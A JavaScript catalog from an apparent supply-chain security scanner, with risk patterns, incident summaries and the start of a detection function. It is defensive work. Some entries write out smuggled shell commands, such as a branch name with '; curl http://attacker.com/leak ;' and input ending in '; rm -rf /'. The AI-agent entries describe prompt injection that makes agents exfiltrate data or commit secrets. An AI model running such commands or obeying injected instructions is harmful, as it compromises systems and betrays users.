export const OTS_PATTERN_DEFINITIONS = [
  // --- Pack 1: npm Supply-Chain Pattern Pack ---
  {
    id: 'hidden-dependency-injection',
    name: 'Hidden Dependency Injection',
    category: 'dependency-chain',
    defaultSeverity: 'high',
    shortDescription: 'A trusted package introduces a new dependency that carries separate, unverified risk.',
    whyItMatters: 'Attackers often compromise a highly-trusted package and sneak in malicious code by hiding it inside a newly introduced nested dependency that developers do not inspect.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Review the newly added dependency, compare the lockfile diff, and pin or replace the parent package if the sub-dependency is suspicious.',
    realWorldExamples: ['Axios compromise shadowing', 'ua-parser-js backdoor injection'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'install-time-remote-execution',
    name: 'Install-Time Remote Execution',
    category: 'package-behavior',
    defaultSeverity: 'critical',
    shortDescription: 'The package executes scripts during installation and retrieves executable files from a remote source.',
    whyItMatters: 'Lifecycle scripts (preinstall/postinstall) run on developer machines or CI runners before normal application sandboxing or code inspection can happen.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Replace the package immediately, run npm install with --ignore-scripts, or isolate the build environment.',
    realWorldExamples: ['eslint-scope token stealer', 'crossenv payload downloader'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'lookalike-package-injection',
    name: 'Typosquat / Lookalike Package',
    category: 'dependency-chain',
    defaultSeverity: 'high',
    shortDescription: 'The package name is slightly modified from a popular open-source library, indicating typosquatting.',
    whyItMatters: 'Attackers register lookalike names (e.g. "reqeust" instead of "request") to trick developer typos and compromise dependency trees.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Correct the spelling to the official package, delete the typosquatted package, and purge local caches.',
    realWorldExamples: ['cross-env lookalikes', 'ts-node typosquats'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'fresh-release-cooldown-violation',
    name: 'Fresh Release Cooldown Violation',
    category: 'release-anomaly',
    defaultSeverity: 'medium',
    shortDescription: 'The package version was published inside the organization’s trust cooldown window (e.g., less than 72 hours ago).',
    whyItMatters: 'Malicious packages are often spotted and removed from registries within a few hours or days. Installing new versions immediately exposes pipelines to zero-days.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Pin to the previous stable version and wait for the cooldown window to pass before upgrading.',
    realWorldExamples: ['Short-lived dependency-confusion releases'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'maintainer-account-compromise-signal',
    name: 'Maintainer Account Compromise Signal',
    category: 'release-anomaly',
    defaultSeverity: 'high',
    shortDescription: 'The publisher account or signing key changed unexpectedly shortly before this release.',
    whyItMatters: 'A compromised maintainer account allows attackers to push signed malicious updates to the official package namespace.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Perform an audit of the release code diff and contact the maintainers to verify publishing credentials.',
    realWorldExamples: ['event-stream flatmap compromise'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'trusted-publishing-bypass',
    name: 'Trusted Publishing Bypass',
    category: 'provenance',
    defaultSeverity: 'high',
    shortDescription: 'The release bypassed the automated, OIDC-verified trusted publishing pipeline of the repository.',
    whyItMatters: 'If a project configured with GitHub Actions OIDC trusted publishing is suddenly published manually from a developer machine, it suggests a stolen token or compromised machine.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Inspect the release integrity, search for OIDC attestations, and request confirmation from the authors.',
    realWorldExamples: ['PyPI manual release overrides'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'source-package-mismatch',
    name: 'Source / Package Mismatch',
    category: 'provenance',
    defaultSeverity: 'high',
    shortDescription: 'The compiled package code differs significantly from the code in the linked GitHub repository.',
    whyItMatters: 'Attackers can keep the GitHub repository clean while injecting a backdoor exclusively inside the tarball uploaded to the registry.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Audit the tarball contents directly using OpenSoyce diff viewer or compile from the tagged source commit.',
    realWorldExamples: ['xz-utils backdoor payload hiding'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'known-vulnerability-exposure',
    name: 'Known Vulnerability Exposure',
    category: 'known-vulnerability',
    defaultSeverity: 'critical',
    shortDescription: 'The package or version is referenced by a known CVE, GHSA, or OpenSoyce advisory.',
    whyItMatters: 'Installing a package with a published vulnerability gives attackers a documented exploit path before the project has time to patch — and the advisory itself is often the first thing scanners outside of OpenSoyce pick up.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Upgrade to a patched version listed in the advisory, or replace the package; if no fix exists, file an exception with a documented expiry and mitigation note.',
    realWorldExamples: ['log4shell (CVE-2021-44228)', 'Spring4Shell unpatched ingestion'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'install-time-execution',
    name: 'Install-Time Lifecycle Execution',
    category: 'package-behavior',
    defaultSeverity: 'medium',
    shortDescription: 'The package runs npm lifecycle scripts (preinstall / install / postinstall) on every install, without observed remote payload retrieval.',
    whyItMatters: 'Lifecycle scripts run with full developer or CI permissions before any code inspection happens. Even non-remote scripts can read environment variables, write outside the install directory, or alter local tooling. This is the lower-severity sibling of install-time-remote-execution — the script exists, but evidence of a network call is absent.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Audit the lifecycle script content, prefer a fork or alternative without postinstall hooks, or install with `--ignore-scripts` in CI.',
    realWorldExamples: ['node-ipc protest payload (initially via postinstall)'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'dependency-confusion-risk',
    name: 'Dependency Confusion Risk',
    category: 'dependency-chain',
    defaultSeverity: 'high',
    shortDescription: 'The dependency name shadows an internal/private package namespace also published to a public registry, opening a dependency-confusion attack path.',
    whyItMatters: 'When internal package names also exist publicly, package managers can resolve the public (potentially malicious) version over the intended internal one. Attackers register the public name to intercept builds at install time.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Scope private packages to a verified org namespace, configure a registry proxy that prefers internal sources, and lock the dependency to the internal feed.',
    realWorldExamples: ['Alex Birsan 2021 disclosure across 35+ companies', '`@internal/`-style internal-name public exposures'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'high-blast-radius',
    name: 'High Blast Radius',
    category: 'package-behavior',
    defaultSeverity: 'high',
    shortDescription: 'The package is depended on by a large number of downstream projects, so any compromise affects a wide surface.',
    whyItMatters: 'Even a low-severity issue in a high-blast-radius package can become a high-impact incident because of how many downstream pipelines pull it. Compromised maintainer accounts on such packages are catastrophic.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Pin the version, enable maintainer-change alerts, and review release diffs before bumping.',
    realWorldExamples: ['ua-parser-js compromise downstream sprawl', 'event-stream breach reaching production at scale'],
    coverageStatus: 'gate-active'
  },

  // --- Pack 2: GitHub Actions Pattern Pack ---
  {
    id: 'mutable-ci-tag-drift',
    name: 'Mutable CI Tag Drift',
    category: 'ci-cd',
    defaultSeverity: 'medium',
    shortDescription: 'A third-party GitHub action is referenced by a mutable version tag (e.g. @v3) rather than an immutable commit SHA.',
    whyItMatters: 'Attackers who gain write access to the action repo can overwrite the release tag to point to a malicious commit, executing arbitrary code in your CI.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Update the workflow file to pin actions to full 40-character commit SHAs, accompanied by a comment containing the version tag.',
    realWorldExamples: ['Drifting tags on utility actions'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'ci-secret-exposure-path',
    name: 'CI Secret Exposure Path',
    category: 'ci-cd',
    defaultSeverity: 'critical',
    shortDescription: 'A third-party script or action runs in a workflow step that has access to sensitive environment secrets.',
    whyItMatters: 'Compromised dependencies or actions running in a privileged step can read and exfiltrate GitHub tokens, cloud API keys, or deploy passwords.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Move secret access to separate, isolated jobs or run the untrusted step in a sandboxed runner with no environment variables.',
    realWorldExamples: ['Codecov Bash Uploader leak'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'pull-request-target-abuse',
    name: 'pull_request_target Trigger Abuse',
    category: 'ci-cd',
    defaultSeverity: 'critical',
    shortDescription: 'The workflow runs on pull_request_target and checks out or executes untrusted code from the fork PR.',
    whyItMatters: 'pull_request_target runs in the context of the base branch and has access to repository write tokens and secrets. Running checkout of fork code allows attackers to steal secrets.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Remove git checkout of fork code from workflows triggered by pull_request_target, or strictly enforce manual approval.',
    realWorldExamples: ['Fork PR token leaks on open-source projects'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'untrusted-workflow-input',
    name: 'Untrusted Workflow Input Injection',
    category: 'ci-cd',
    defaultSeverity: 'high',
    shortDescription: 'The workflow interpolates untrusted values (such as issue titles or PR bodies) directly into inline run scripts.',
    whyItMatters: 'Attackers can name a branch or issue with bash commands (e.g. "; curl http://attacker.com/leak ;") resulting in command injection during CI execution.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Pass inputs as environment variables in the action step instead of directly interpolating them into bash scripts.',
    realWorldExamples: ['PR Title command injection bugs'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'third-party-action-with-secrets',
    name: 'Third-Party Action with Secrets Access',
    category: 'ci-cd',
    defaultSeverity: 'medium',
    shortDescription: 'An action from an unverified publisher is granted direct access to secrets via inputs.',
    whyItMatters: 'Secrets passed to unverified actions can be quietly sent to an external server by the action logic.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Only pass secrets to actions published by GitHub-verified partners or audit the source code of the action.',
    realWorldExamples: ['Exfiltration through malicious helper actions'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'unpinned-action-reference',
    name: 'Unpinned Action Reference',
    category: 'ci-cd',
    defaultSeverity: 'low',
    shortDescription: 'An action is referenced using the default branch name (e.g. @master) rather than a stable release or SHA.',
    whyItMatters: 'The default branch changes constantly, making the CI build non-deterministic and susceptible to immediate breakage or compromise if the branch is poisoned.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Pin the action reference to a tag or commit SHA.',
    realWorldExamples: ['CI breakage due to unexpected action refactoring'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'dangerous-release-permission',
    name: 'Dangerous Release/Write Permission',
    category: 'ci-cd',
    defaultSeverity: 'high',
    shortDescription: 'The workflow has explicit GITHUB_TOKEN write permissions for packages or releases in general steps.',
    whyItMatters: 'If any dependency runs arbitrary code in a build with release-write permissions, it can overwrite official assets or release packages.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Restrict workflow permissions globally to read-only, and only enable write permissions on targeted deployment jobs.',
    realWorldExamples: ['Backdooring release binaries during build'],
    coverageStatus: 'gate-active'
  },

  // --- Pack 3: Developer Tool Pattern Pack ---
  {
    id: 'poisoned-extension-risk',
    name: 'Poisoned IDE Extension Risk',
    category: 'developer-tool',
    defaultSeverity: 'high',
    shortDescription: 'A developer tool or IDE extension has features that download and execute dynamic binaries.',
    whyItMatters: 'Attackers target IDE marketplaces (like VS Code Marketplace) with useful tools containing hidden backdoors to gain local code execution on developer machines.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Limit extension installations to vetted publishers and check the reputation/rating history.',
    realWorldExamples: ['Poisoned VS Code theme extensions'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'broad-workspace-access',
    name: 'Broad Workspace Access',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The extension or tool requests permissions to access files outside the active workspace directory.',
    whyItMatters: 'Malicious tools use wide file access to scan for SSH keys, AWS credentials, or sensitive files in the developer home directory.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Configure IDE sandboxing or run extensions in restricted workspace modes.',
    realWorldExamples: ['SSH key exfiltration by linting tools'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'credential-path-access',
    name: 'Credential Path Access',
    category: 'developer-tool',
    defaultSeverity: 'high',
    shortDescription: 'The developer tool attempts to read directories like ~/.aws, ~/.ssh, or system keychain databases.',
    whyItMatters: 'Local developer credentials are highly valuable. Staling keys allows attackers to pivot into production enterprise cloud accounts.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Block the extension, audit the network logs of the developer machine, and rotate compromised secrets.',
    realWorldExamples: ['Malicious git helpers stealing keys'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'local-shell-execution',
    name: 'Local Shell Execution',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The developer tool runs system shell commands as a background process.',
    whyItMatters: 'IDE plugins can execute background commands silently, downloading scripts or modifying source code files without triggering compiler alerts.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Inspect execution logs and verify if background shell execution is required for the tool utility.',
    realWorldExamples: ['Webpack dev server exploits'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'unknown-remote-endpoint',
    name: 'Unknown Remote Endpoint Communication',
    category: 'developer-tool',
    defaultSeverity: 'high',
    shortDescription: 'The tool communicates with non-standard, unvetted server endpoints over HTTPS or raw sockets.',
    whyItMatters: 'Exfiltrating developer data or receiving shell commands requires a Command and Control (C2) server, which can be spotted through network auditing.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Restrict egress network traffic for IDE processes or block the associated domain.',
    realWorldExamples: ['C2 traffic in compromised CLI utilities'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'publisher-identity-drift',
    name: 'Publisher Identity Drift',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The developer tool publisher changed domains, emails, or registry namespaces suddenly.',
    whyItMatters: 'Drift in publisher identity often indicates expired domain takeovers, allowing attackers to hijack update feeds.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Verify the identity of the publisher and cross-reference with the official source repository.',
    realWorldExamples: ['Stale domain hijackings of IDE extensions'],
    coverageStatus: 'gate-active'
  },
  {
    id: 'marketplace-reputation-anomaly',
    name: 'Marketplace Reputation Anomaly',
    category: 'developer-tool',
    defaultSeverity: 'medium',
    shortDescription: 'The developer tool has high install counts but near-zero reviews or sudden negative review spikes.',
    whyItMatters: 'Attackers buy fake installs to boost search rank and make a poisoned tool look highly reputable.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Do not install tools with low reviews/ratings despite high download statistics.',
    realWorldExamples: ['Installs-for-hire marketplace scams'],
    coverageStatus: 'roadmap'
  },

  // --- Pack 4: AI Agent Workflow Pattern Pack ---
  {
    id: 'prompt-to-agent-injection',
    name: 'Indirect Prompt Injection on Agent',
    category: 'ai-agent',
    defaultSeverity: 'high',
    shortDescription: 'The AI agent processes untrusted inputs (e.g. issue comments, README files) where attackers can inject instructions.',
    whyItMatters: 'AI agents that read data from issues or PRs can be hijacked by hidden prompts in the text, telling the agent to write bugs or bypass auth.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Isolate agent instructions from user-provided data, and use system prompt boundaries.',
    realWorldExamples: ['Indirect prompt injections hijacking code-generation bots'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'prompt-to-script-injection',
    name: 'Prompt-to-Script Command Injection',
    category: 'ai-agent',
    defaultSeverity: 'critical',
    shortDescription: 'The agent translates user requests into terminal commands and executes them without parsing or escaping.',
    whyItMatters: 'If the agent accepts input like "delete file name; rm -rf /", prompt instructions can cause the agent to run dangerous commands on the runner.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Run agent executions in ephemeral, read-only containers and enforce runtime strict command schemas.',
    realWorldExamples: ['Arbitrary code execution via agent tools'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'untrusted-issue-body-to-agent-prompt',
    name: 'Untrusted Issue Feed to Agent Prompt',
    category: 'ai-agent',
    defaultSeverity: 'medium',
    shortDescription: 'The agent triggers automatically on issue creations and feeds the raw markdown body straight to the system prompt.',
    whyItMatters: 'Attackers can file issues with system-override instructions that force the agent to exfiltrate database records or commit secrets.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Sanitize issue bodies, strip out prompt markers, and filter inputs before passing to LLM APIs.',
    realWorldExamples: ['Exfiltration of agent environment variables via issue body injections'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'agent-output-to-shell',
    name: 'Direct Agent Output to Shell',
    category: 'ai-agent',
    defaultSeverity: 'critical',
    shortDescription: 'The system takes generated output from the agent and immediately pipes it to a local shell or evaluation command.',
    whyItMatters: 'Direct shell piping creates a critical path where any jailbreak or compromise of the LLM leads to immediate server compromise.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Enforce human-in-the-loop review for all commands generated by the agent before shell execution.',
    realWorldExamples: ['Auto-GPT-style execution failures'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'agent-with-write-token',
    name: 'AI Agent Running with Write Token',
    category: 'ai-agent',
    defaultSeverity: 'high',
    shortDescription: 'An automated AI agent runs in a pipeline equipped with a GitHub write or admin token.',
    whyItMatters: 'If hijacked by prompt injection, the agent can write commits directly to main, bypass pull request reviews, or overwrite branch protection settings.',
    defaultPolicyImpact: 'warn',
    recommendedAction: 'Restrict the agent’s GitHub token permissions to read-only or require approvals for all branch write actions.',
    realWorldExamples: ['Auto-commit bot compromises'],
    coverageStatus: 'roadmap'
  },
  {
    id: 'agent-with-release-permission',
    name: 'AI Agent Running with Release Permission',
    category: 'ai-agent',
    defaultSeverity: 'critical',
    shortDescription: 'An automated agent is granted publishing tokens (e.g. npm publish, PyPI) or release branch privileges.',
    whyItMatters: 'An agent compromised via prompt injection can publish a backdoor version of your software to package registries under your organization name.',
    defaultPolicyImpact: 'block',
    recommendedAction: 'Ensure publishing and releasing are exclusively performed by cryptographically signed human actions or verified OIDC jobs.',
    realWorldExamples: ['Registry hijacking through automated CD tokens'],
    coverageStatus: 'roadmap'
  }
];

export const OTS_PATTERN_PACKS = [
  {
    id: 'npm-supply-chain',
    name: 'npm Supply-Chain Pattern Pack',
    description: 'Tracks recurring risk patterns in package registries: compromised maintainers, typosquatting, remote download scripts, source mismatches, known vulnerabilities, and blast-radius amplification.',
    patternIds: [
      'hidden-dependency-injection',
      'install-time-remote-execution',
      'install-time-execution',
      'lookalike-package-injection',
      'fresh-release-cooldown-violation',
      'maintainer-account-compromise-signal',
      'trusted-publishing-bypass',
      'source-package-mismatch',
      'known-vulnerability-exposure',
      'dependency-confusion-risk',
      'high-blast-radius'
    ]
  },
  {
    id: 'github-actions',
    name: 'GitHub Actions Pattern Pack',
    description: 'Identifies configuration drifts, mutable version tags, untrusted workflow inputs, and dangerous environment variable exposures in CI/CD.',
    patternIds: [
      'mutable-ci-tag-drift',
      'ci-secret-exposure-path',
      'pull-request-target-abuse',
      'untrusted-workflow-input',
      'third-party-action-with-secrets',
      'unpinned-action-reference',
      'dangerous-release-permission'
    ]
  },
  {
    id: 'developer-tool',
    name: 'Developer Tool Pattern Pack',
    description: 'Analyzes IDE extensions, local shell integrations, key path access, and marketplace anomalies to secure developer laptops.',
    patternIds: [
      'poisoned-extension-risk',
      'broad-workspace-access',
      'credential-path-access',
      'local-shell-execution',
      'unknown-remote-endpoint',
      'publisher-identity-drift',
      'marketplace-reputation-anomaly'
    ]
  },
  {
    id: 'ai-agent-workflow',
    name: 'AI Agent Workflow Pattern Pack',
    description: 'Guards against indirect prompt injections, unsafe shell outputs, and overly-privileged tokens in LLM-driven software engineering workflows.',
    patternIds: [
      'prompt-to-agent-injection',
      'prompt-to-script-injection',
      'untrusted-issue-body-to-agent-prompt',
      'agent-output-to-shell',
      'agent-with-write-token',
      'agent-with-release-permission'
    ]
  }
];

// Public proof page (/proof/ots-replays) only renders incidents where
// sourceConfidence is 'primary' or 'authoritative-secondary'. Entries marked
// 'unverified' are kept here as research backlog and excluded from the proof
// surface by scripts/test-ots-replays.mjs.
export const OTS_INCIDENTS = [
  {
    id: 'xz-utils-backdoor',
    name: 'xz-utils Backdoor (CVE-2024-3094)',
    date: 'March 29, 2024',
    target: 'xz-utils 5.6.0 / 5.6.1 (liblzma)',
    sourceUrl: 'https://tukaani.org/xz-backdoor/',
    sourceConfidence: 'primary',
    description: 'A long-game maintainer infiltration planted a backdoor inside the release tarballs of xz-utils 5.6.0 and 5.6.1, executing inside sshd via a build-time injection that was absent from the upstream git source.',
    context: 'xz-utils is a foundational compression library shipped in every major Linux distribution, including the build chain for OpenSSH. The compromise targeted release tarballs rather than the git source, exploiting the long-standing convention that tarballs match the tagged source tree.',
    whatHappened: 'The release tarballs of 5.6.0 and 5.6.1 contained a backdoor introduced by a maintainer (operating under the alias "Jia Tan") who had built trust over a period of ~2 years. The backdoor injected code during the build via build-to-host.m4 that compromised sshd authentication. Andres Freund discovered the backdoor by investigating an unusual ~500ms ssh login latency. CVE-2024-3094 was assigned.',
    triggeredPatternIds: [
      'known-vulnerability-exposure',
      'source-package-mismatch'
    ],
    preventionStrategy: 'Compile from tagged source commits rather than tarballs when possible; pin distribution package versions and require advisory clearance before bumping; require reproducible-build verification for cryptographic and SSH-adjacent libraries.'
  },
  {
    id: 'tj-actions-changed-files',
    name: 'tj-actions/changed-files Compromise (CVE-2025-30066)',
    date: 'March 14–15, 2025',
    target: 'tj-actions/changed-files (GitHub Action)',
    sourceUrl: 'https://github.com/advisories/GHSA-mrrh-fwg8-r2c3',
    sourceConfidence: 'primary',
    description: 'Attackers retroactively rewrote multiple version tags of the popular tj-actions/changed-files Action to point to a malicious commit, causing affected workflow runs to dump CI/CD secrets into the GitHub Actions log output.',
    context: 'tj-actions/changed-files is referenced by tens of thousands of repositories. Because workflows commonly pin to mutable tags (e.g. @v35) rather than to a full commit SHA, retroactive tag drift propagates to every consumer on next run.',
    whatHappened: 'Per the GitHub Advisory, attackers gained the ability to push to the upstream repository between March 14 and March 15, 2025, and rewrote multiple version tags to a single malicious commit. The injected script extracted secrets from the Runner Worker process memory and printed them in GitHub Actions logs. Over 23,000 repositories were impacted; repositories with public workflow logs faced higher exposure because leaked secrets became publicly readable.',
    triggeredPatternIds: [
      'mutable-ci-tag-drift',
      'ci-secret-exposure-path',
      'unpinned-action-reference',
      'third-party-action-with-secrets'
    ],
    preventionStrategy: 'Pin every third-party Action to a full 40-character commit SHA; restrict GITHUB_TOKEN to the minimum permission set per job; gate secret-bearing jobs behind explicit allow-listed Actions.'
  },
  {
    id: 'polyfill-io-supply-chain',
    name: 'polyfill.io CDN Supply-Chain Compromise',
    date: 'June 2024',
    target: 'polyfill.io (CDN-served JavaScript)',
    sourceUrl: 'https://sansec.io/research/polyfill-supply-chain-attack',
    corroboratingSourceUrl: 'https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet/',
    sourceConfidence: 'authoritative-secondary',
    description: 'After a change of ownership of the polyfill.io domain, the CDN began injecting malicious JavaScript into responses, redirecting mobile traffic and selectively evading detection in admin/analytics contexts.',
    context: 'polyfill.io was historically embedded directly into HTML pages of more than 100,000 sites via a <script src="..."> tag. When ownership of the domain changed hands, every downstream consumer became reliant on the new operator\'s trustworthiness.',
    whatHappened: 'Sansec\'s investigation found that the polyfill.io CDN began injecting malicious payloads that redirected mobile users to attacker-controlled destinations. The payload used fake Google Analytics-looking domains and conditionally suppressed activation in admin and analytics contexts to evade discovery. Cloudflare independently warned that polyfill.io could no longer be trusted and shipped automatic mirror replacement.',
    triggeredPatternIds: [
      'unknown-remote-endpoint',
      'publisher-identity-drift'
    ],
    preventionStrategy: 'Self-host critical browser polyfills, prefer subresource integrity (SRI) hashes for third-party CDN scripts, and monitor CNAME / WHOIS ownership of any third-party origin in your runtime supply chain.'
  },
  {
    id: 'ua-parser-js-compromise',
    name: 'ua-parser-js npm Compromise (GHSA-pjwm-rvh2-c87w)',
    date: 'October 22, 2021',
    target: 'ua-parser-js 0.7.29 / 0.8.0 / 1.0.0 (npm)',
    sourceUrl: 'https://github.com/advisories/GHSA-pjwm-rvh2-c87w',
    sourceConfidence: 'primary',
    description: 'The npm publishing account of a single maintainer was compromised, and three malicious versions were published that ran an install-time payload to steal credentials and install a cryptocurrency miner across multiple operating systems.',
    context: 'ua-parser-js is downloaded ~8 million times per week. The advisory and the maintainer\'s public statement instructed affected users to treat any computer that installed the malicious versions as fully compromised and rotate all secrets accessible from that machine.',
    whatHappened: 'Per GHSA-pjwm-rvh2-c87w, malicious versions 0.7.29, 0.8.0, and 1.0.0 were published to npm. The preinstall lifecycle script fetched and executed a remote payload that varied per OS (Windows credential stealer + miner; Linux miner). Patched versions 0.7.30, 0.8.1, and 1.0.1 were released within ~4 hours of discovery.',
    triggeredPatternIds: [
      'known-vulnerability-exposure',
      'install-time-remote-execution',
      'maintainer-account-compromise-signal'
    ],
    preventionStrategy: 'Disable npm install lifecycle scripts by default in CI (`npm ci --ignore-scripts`), require a cooldown window before bumping critical-path dependencies, and enable 2FA on every publishing account.'
  },
  {
    id: 'event-stream-flatmap-stream',
    name: 'event-stream / flatmap-stream Hidden Dependency Injection',
    date: 'November 2018',
    target: 'event-stream 3.3.6 (npm)',
    sourceUrl: 'https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident',
    sourceConfidence: 'primary',
    description: 'A new maintainer of the popular event-stream package added flatmap-stream as a direct dependency; flatmap-stream contained an obfuscated payload that activated only inside Copay cryptocurrency wallet builds.',
    context: 'event-stream is a heavily-used npm streaming utility. The npm postmortem documents how the original maintainer transferred control to a new contributor who had no prior reputation; the new dependency was added in event-stream 3.3.6.',
    whatHappened: 'Per npm\'s incident report, flatmap-stream@0.1.1 was added as a direct dependency of event-stream@3.3.6 by the new maintainer. The malicious code decrypted a hidden payload under specific build conditions (Copay wallet builds), then harvested account credentials and private keys. The injection survived initial review because the payload activated conditionally and the obfuscation looked like legitimate compiled output.',
    triggeredPatternIds: [
      'hidden-dependency-injection',
      'maintainer-account-compromise-signal'
    ],
    preventionStrategy: 'Treat maintainer-transfer events as high-risk; require lockfile-diff review when a trusted package gains a new direct dependency; analyze conditional code paths in transitive dependencies before adoption.'
  },
  {
    id: 'ledger-connect-kit',
    name: 'Ledger Connect Kit npm + CDN Compromise',
    date: 'December 14, 2023',
    target: '@ledgerhq/connect-kit 1.1.5 / 1.1.6 / 1.1.7 (npm)',
    sourceUrl: 'https://www.ledger.com/blog/security-incident-report',
    sourceConfidence: 'primary',
    description: 'A former Ledger employee\'s npm account was phished, and three malicious versions of @ledgerhq/connect-kit were published; because DApps loaded Connect Kit dynamically via CDN, the drainer payload propagated to every downstream dApp without a new build.',
    context: 'Connect Kit is the JavaScript library that DApps use to talk to Ledger hardware wallets. Because DApps loaded it via CDN at runtime (not bundled), a single npm publish reached every consumer immediately.',
    whatHappened: 'Per Ledger\'s incident report, a former employee\'s NPMJS account was compromised via a phishing campaign and used to publish malicious versions 1.1.5, 1.1.6, and 1.1.7. The injected payload was a wallet drainer. DApps loaded the malicious Connect Kit via CDN-style runtime loading, so every downstream consumer was affected within the ~5-hour window before takedown.',
    triggeredPatternIds: [
      'maintainer-account-compromise-signal',
      'unknown-remote-endpoint'
    ],
    preventionStrategy: 'Revoke publishing credentials immediately on employee offboarding; treat CDN-loaded runtime libraries as part of the production supply chain (pin to a specific version + verify SRI); require code review on every npm publish for security-critical libraries.'
  }
];

export function getOtsPatternDefinition(id) {
  return OTS_PATTERN_DEFINITIONS.find((pattern) => pattern.id === id);
}

export function getOtsIncident(id) {
  return OTS_INCIDENTS.find((incident) => incident.id === id);
}

/**
 * Quantify/detect OTS patterns matching a scanned dependency package row.
 * Maps signals (vulnerability fields, threat fields, capability profiles,
 * installation scripts) to pattern rules.
 *
 * Demo fixtures: certain literal package names (`axios@1.14.1`,
 * `malicious-pkg`, `@internal/payments`) historically fired patterns to
 * drive the in-product demos. As of the coverage-honesty pass, these are
 * gated behind `context.allowDemoFixtures` (default `false`) so production
 * gate paths never emit synthetic signals — only real OSV/lockfile/repo
 * data triggers patterns. Tests, the incident replay engine, and the
 * Project Detail demo page opt-in explicitly.
 */
export function detectOtsPatternsForRow(row, context = {}) {
  const patterns = [];
  const name = String(row.package || row.name || '').toLowerCase();
  const version = String(row.version || '').toLowerCase();
  const severity = String(row.severity || '').toLowerCase();
  const allowDemoFixtures = context.allowDemoFixtures === true;

  const mockAxios = allowDemoFixtures
    && name === 'axios'
    && (version === '1.14.1' || version === '1.14.1-style');
  const demoMaliciousPkg = allowDemoFixtures && name === 'malicious-pkg';
  const demoInternalPayments = allowDemoFixtures && name === '@internal/payments';

  // 1. Known Vulnerability Exposure
  if (
    severity === 'critical' ||
    (row.ids && Array.isArray(row.ids) && (
      row.ids.some(id => String(id).startsWith('CVE-')) ||
      row.ids.some(id => String(id).startsWith('GHSA-')) ||
      row.ids.some(id => String(id).startsWith('SOYCE-'))
    )) ||
    mockAxios ||
    demoMaliciousPkg
  ) {
    // Catalog severity for this pattern is critical (worst-case risk
    // class). Observed severity comes from the upstream signal — OSV
    // returns CRITICAL/HIGH/MODERATE/LOW per vuln; the gate threads
    // that into row.severity. When observed differs from catalog,
    // policy still BLOCKs because the pattern itself is critical-class,
    // but the evidence card surfaces the real per-match severity.
    const observedSeverityForVuln = severity || 'critical';
    patterns.push({
      patternId: 'known-vulnerability-exposure',
      severity: observedSeverityForVuln,
      catalogSeverity: 'critical',
      policyImpact: 'block',
      confidence: 0.95,
      evidence: [
        { label: 'Signal Source', value: mockAxios ? 'Sandbox simulation' : (row.ids && row.ids.length > 0 ? row.ids.join(', ') : 'Threat DB') },
        { label: 'Severity Tier', value: observedSeverityForVuln.charAt(0).toUpperCase() + observedSeverityForVuln.slice(1) }
      ]
    });
  }

  // 2. Install-Time execution
  if (row.hasInstallScript === true || mockAxios || demoMaliciousPkg) {
    const cap = row.capabilityProfile || {};
    const hasRemote = cap.remoteExecution === true || cap.networkAccess === true || cap.downloadsRemoteCode === true || mockAxios || demoMaliciousPkg;
    
    if (hasRemote) {
      patterns.push({
        patternId: 'install-time-remote-execution',
        severity: 'critical',
        policyImpact: 'block',
        confidence: 0.92,
        evidence: [
          { label: 'Install Script', value: 'preinstall/postinstall script present' },
          { label: 'Egress Behavior', value: 'Remote payload download requested' }
        ]
      });
    } else {
      patterns.push({
